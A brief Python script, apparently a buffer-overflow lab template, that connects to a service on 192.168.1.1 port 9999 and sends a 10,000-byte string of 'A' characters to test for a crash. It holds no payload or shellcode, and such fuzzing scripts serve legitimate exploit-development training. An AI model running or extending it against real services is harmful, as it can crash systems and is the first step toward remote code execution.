#!/usr/bin/env python

##Author : Paranoid Ninja
##Email  : paranoidninja@protonmail.com
##Descr  : Simple script to modify and test Buffer Overflows

import socket

buffer = "A"*10000

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print ('Sending buffer..')
connect=s.connect(('192.168.1.1',9999))
s.recv(1024)
s.send(buffer + '\r\n')
s.recv(1024)
s.close()
